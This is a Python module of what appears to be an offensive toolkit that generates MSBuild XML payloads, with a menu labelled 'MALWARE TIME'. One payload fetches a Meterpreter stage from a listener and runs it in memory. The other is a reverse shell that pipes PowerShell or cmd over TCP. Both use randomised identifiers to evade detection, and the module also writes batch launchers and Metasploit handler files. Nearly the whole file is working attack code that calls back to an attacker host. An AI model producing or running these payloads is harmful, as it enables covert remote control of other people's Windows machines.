#! /usr/bin/env python3
##MSBuild Payloads
import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()
customfolder = m.loc + "/aMALgamation/current/MSBuildCustom/"
if not os.path.exists(customfolder):
    os.makedirs(customfolder)

##  32 bit regsrv32 custom payload
def msbuild():
    os.system("clear")
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\t***MALWARE TIME!!!!!***\n\n" + m.bcolors.ENDC)


    while (1):
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)
        print(m.bcolors.BOLD + m.bcolors.GREEN + """
        *******************************************************************
          _   _   _   _   _   _   _     _   _   _   _  
         / \ / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
        ( M | S | B | u | i | l | d ) ( M | e | n | u )
         \_/ \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
                  """ + m.bcolors.ENDC)

        print(
            m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
        print("\t(1)\tGenerate Meterpreter MSBuild payload")
        print("\t(2)\tGenerate Shell MSBuild payload")
        print("\t(99)\tGo back to the Custom Malware Menu")
        print(
          m.bcolors.GREEN + m.bcolors.BOLD + "\tAll payloads and RC files will be put in:"+ m.bcolors.ERROR + customfolder + m.bcolors.ENDC)
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)

        options = input("\nW4@+ Ma1w@r3 R U W@^t1ng Brobi-Wan: ")
        if options == "1":
           metms()
        elif options == "2":
           shems()
        elif options == "99":
           os.system("clear")
           break
        else:
           input("You must be a Pats Fan! Come on pick something... ")

##  MSBuild
def metms():
  print(
    m.bcolors.ERROR + m.bcolors.BOLD + "\tAt any time you can go back to the menu by inputting q or Q" + m.bcolors.ENDC)
  port = "null"
  xfilename = "null"
  batfile = "null"
  if (port == "null"):
      port = input("\tWhat Port are you wanting to use?:")

      if port == 'q':
          return
      elif port == 'Q':
          return
      else:
          print("\tYour port is: " + port)
  if (xfilename == "null"):
      bfilename = input("\tWhat is the name of your base64 payload file?:")

      if bfilename == 'q':
          return
      elif bfilename == 'Q':
          return
      else:
          print("\tBase64 payload  name set to: " + bfilename)
  if (batfile == "null"):
      batfile = input("\tWhat is the name of your batch payload file?:")

      if batfile == 'q':
          return
      elif batfile == 'Q':
          return
      else:
          print("\tBatch file name set to: " + batfile)
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating MSBuild ------- Named: " + xfilename + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating  MSBuild MET XML file...")
  getdataname = m.randomString(9)
  targetname = m.randomString(7)
  classname = m.randomString(10)
  injectName = m.randomString(8)
  hostName = m.randomString(12)
  portName = m.randomString(9)
  ipName = m.randomString()
  sockName = m.randomString(8)
  length_rawName = m.randomString(11)
  lengthName = m.randomString(9)
  sName1 = m.randomString(10)
  total_bytesName = m.randomString(7)
  handleName = m.randomString(8)
  sName2 = m.randomString()
  funcAddrName = m.randomString()
  hThreadName = m.randomString()
  threadIdName = m.randomString()
  pinfoName = m.randomString()
  sName3 = m.randomString()
  y = [m.randomString(8) for x in range(17)]
  msbmet = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->\n\t<Target Name="{0}">
            <{1} /> 
          </Target>
          <UsingTask
            TaskName="{1}"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>

              <Code Type="Class" Language="cs">
              <![CDATA[
""".format(targetname, classname)
  msbmet += "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
  msbmet += "public class %s : Task, ITask {\n" % (classname)
  msbmet += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
  msbmet += "static byte[] %s(string %s, int %s) {\n" %(getdataname, hostName, portName)
  msbmet += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
  msbmet += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
  msbmet += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
  msbmet += "    catch { return null;}\n"
  msbmet += "    byte[] %s = new byte[4];\n" %(length_rawName)
  msbmet += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
  msbmet += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
  msbmet += "    byte[] %s = new byte[%s + 5];\n" %(sName1, lengthName)
  msbmet += "    int %s = 0;\n" %(total_bytesName)
  msbmet += "    while (%s < %s)\n" %(total_bytesName, lengthName)
  msbmet += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName1, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
  msbmet += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
  msbmet += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName1, sName1)
  msbmet += "    return %s;}\n" %(sName1)
  msbmet += "static void %s(byte[] %s) {\n" %(injectName, sName2)
  msbmet += "    if (%s != null) {\n" %(sName2)
  msbmet += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, sName2)
  msbmet += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, sName2)
  msbmet += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, sName2, sName2)
  msbmet += '       UInt32 {} = 0;\n'.format(threadIdName)
  msbmet += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
  msbmet += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)
  msbmet += 'public override bool Execute()\n'
  msbmet += '{\n'
  msbmet += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName3, sName3, getdataname, m.listener_ip, port)
  msbmet += "    %s(%s);\n" %(injectName, sName3)
  msbmet += "return true;            }       }\n"
  msbmet += "                                ]]>\n"
  msbmet += "                        </Code>\n"
  msbmet += "                </Task>\n"
  msbmet += "        </UsingTask>\n"
  msbmet += "</Project>"

  msbmet_xml_file = open(customfolder + xfilename + ".xml", "w")
  msbmet_xml_file.write(msbmet)
  msbmet_xml_file.close()

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit MSBuild MET BAT file...")
  msbmet_bat_file = open(customfolder + batfile + ".bat", "w")
  msbmet_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe " + xfilename + ".xml")
  msbmet_bat_file.close()

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
  msf_resource_file = open(customfolder + xfilename + ".rc", "w")
  msf_resource_file.write("""use multi/handler
  set payload %s
  set LHOST %s
  set LPORT %s
  set ExitOnSession false
  exploit -j
  """ % (m.METRT32_Payload, m.listener_ip, port))

def shems():

  a = "powershell.exe"
  b = "cmd.exe"
  payload = "null"
  print(
    m.bcolors.ERROR + m.bcolors.BOLD + "\tAt any time you can go back to the menu by inputting q or Q" + m.bcolors.ENDC)
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
  print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
  print("""
  Best Payloads to use
   (a) ---PowerShell
   (b) ---CMD

 """)

  if (payload == "null"):
    print(
        "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for PowerShell\n")
    payload = input("\tEnter payload type:  ") or a
    if payload == 'a':
        payload = a
    elif payload == 'b':
        payload = b
    elif payload == 'q' or 'Q':
        return
    else:
        print(
            m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\t********Invalid payload***********" + m.bcolors.ENDC)

  port = "null"
  xfilename = "null"
  batfile = "null"
  if (port == "null"):
      port = input("\tWhat Port are you wanting to use?:")

      if port == 'q':
          return
      elif port == 'Q':
          return
      else:
          print("\tYour port is: " + port)
  if (xfilename == "null"):
      xfilename = input("\tWhat is the name of your base64 payload file?:")

      if xfilename == 'q':
          return
      elif xfilename == 'Q':
          return
      else:
          print("\tBase64 payload  name set to: " + xfilename)
  if (batfile == "null"):
      batfile = input("\tWhat is the name of your batch payload file?:")

      if batfile == 'q':
          return
      elif batfile == 'Q':
          return
      else:
          print("\tBatch file name set to: " + batfile)

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating MSBuild ------- Named: " + xfilename + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating  MSBuild PowerShell XML file... " )

  targetname = m.randomString(7)
  classname = m.randomString(10)
  streamwname = m.randomString(8)
  tclientname = m.randomString(12)
  streamname = m.randomString(9)
  sreadername = m.randomString(8)
  stringinname = m.randomString(8)
  processname = m.randomString()
  nmethod = m.randomString(10)
  method2name = m.randomString(7)
  outline = m.randomString(12)
  stroutput = m.randomString()
  method3name = m.randomString(10)
  method4name = m.randomString()


  msbps =  '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
  msbps += '  <Target Name="{0}">\n'.format(targetname)
  msbps += "    <{0} />\n".format(classname)
  msbps += "  </Target>\n"
  msbps += '  <UsingTask\n'
  msbps += '     TaskName="{0}"\n'.format(classname)
  msbps += '     TaskFactory="CodeTaskFactory"\n'
  msbps += '    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">\n'
  msbps += '    <Task>\n'
  msbps += '      <Code Type="Class" Language="cs">\n'
  msbps += '        <![CDATA[\n'
  msbps += "            using System;\n"
  msbps += "            using System.Text;\n"
  msbps += "            using System.IO;\n"
  msbps += "            using System.Diagnostics;\n"
  msbps += "            using System.Net.Sockets;\n"
  msbps += "            using Microsoft.Build.Framework;\n"
  msbps += "            using Microsoft.Build.Utilities;\n\n"
  msbps += "            public class %s : Task, ITask {\n" %(classname)
  msbps += "                static StreamWriter {0};\n".format(streamwname)
  msbps += "                public override bool Execute() {\n"
  msbps += '                using (TcpClient {0} = new TcpClient("{1}", {2}))\n'.format(tclientname, m.listener_ip, port)
  msbps += "               {\n"
  msbps += "                using (Stream {0} = {1}.GetStream())\n".format(streamname, tclientname)
  msbps += "                 {\n"
  msbps += "                    using (StreamReader {0} = new StreamReader({1}))\n".format(sreadername, streamname)
  msbps += "                     {\n"
  msbps += "                        {0} = new StreamWriter({1});\n\n".format(streamwname, streamname)
  msbps += "                        StringBuilder {0} = new StringBuilder();\n\n".format(stringinname)
  msbps += "                        Process {0} = new Process();\n".format(processname)
  msbps += '                        {0}.StartInfo.FileName = "{1}";\n'.format(processname, payload)
  msbps += "                        {0}.StartInfo.CreateNoWindow = true;\n".format(processname)
  msbps += "                        {0}.StartInfo.UseShellExecute = false;\n".format(processname)
  msbps += "                        {0}.StartInfo.RedirectStandardOutput = true;\n".format(processname)
  msbps += "                        {0}.StartInfo.RedirectStandardInput = true;\n".format(processname)
  msbps += "                        {0}.StartInfo.RedirectStandardError = true;\n".format(processname)
  msbps += "                        {0}({1});\n".format(nmethod, processname)
  msbps += "                        {0}.Start();\n".format(processname)
  msbps += "                        {0}.BeginOutputReadLine();\n\n".format(processname)
  msbps += "                        while (true)\n"
  msbps += "                        {\n"
  msbps += "                            {0}.Append({1}.ReadLine());\n".format(stringinname, sreadername)
  msbps += "                            {0}.StandardInput.WriteLine({1});\n".format(processname, stringinname)
  msbps += "                            {0}.Remove(0, {0}.Length);\n".format(stringinname)
  msbps += "                        }\n"
  msbps += "                    }\n"
  msbps += "                }\n"
  msbps += "            }\n"
  msbps += "        }\n\n"
  msbps += "        private static void {0}(Process {1})\n".format(nmethod, processname)
  msbps += "        {\n"
  msbps += "            {0}.OutputDataReceived += new DataReceivedEventHandler({1});\n".format(processname, method2name)
  msbps += "        }\n\n"
  msbps += "        private static void {0}(object sendingProcess, DataReceivedEventArgs {1})\n".format(method2name, outline)
  msbps += "        {\n"
  msbps += "            StringBuilder {0} = new StringBuilder();\n\n".format(stroutput)
  msbps += "            if (!String.IsNullOrEmpty({0}.Data))\n".format(outline)
  msbps += "            {\n"
  msbps += "                {0}({1}, {2});\n".format(method3name, outline, stroutput)
  msbps += "            }\n"
  msbps += "        }\n\n"
  msbps += "        private static void {0}(DataReceivedEventArgs {1}, StringBuilder {2})\n".format(method3name, outline, stroutput)
  msbps += "        {\n"
  msbps += "            {0}({1}, {2});\n".format(method4name, outline, stroutput)
  msbps += "        }\n\n"
  msbps += "        private static void {0}(DataReceivedEventArgs {1}, StringBuilder {2})\n".format(method4name, outline, stroutput)
  msbps += "        {\n"
  msbps += "            try\n"
  msbps += "            {\n"
  msbps += "                {0}.Append({1}.Data);\n".format(stroutput, outline)
  msbps += "                {0}.WriteLine({1});\n".format(streamwname, stroutput)
  msbps += "                {0}.Flush();\n".format(streamwname)
  msbps += "            }\n"
  msbps += "            catch (Exception) { }\n"
  msbps += "		    }\n"
  msbps += "		}\n"
  msbps += "        ]]>\n"
  msbps += "      </Code>\n"
  msbps += "    </Task>\n"
  msbps += "  </UsingTask>\n"
  msbps += "</Project>\n"

  msbps_xml_file = open(customfolder + xfilename + ".xml", "w")
  msbps_xml_file.write(msbps)
  msbps_xml_file.close()

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit MSBuild PowerShell BAT file...")
  msbps_bat_file = open(customfolder + batfile + ".bat", "w")
  msbps_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe " + xfilename + ".xml")
  msbps_bat_file.close()

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
  msf_resource_file = open(customfolder + xfilename + ".rc", "w")
  msf_resource_file.write("""use multi/handler
  set payload %s
  set LHOST %s
  set LPORT %s
  set ExitOnSession false
  exploit -j
  """ % (m.SHELL32_SL_Payload, m.listener_ip, port))
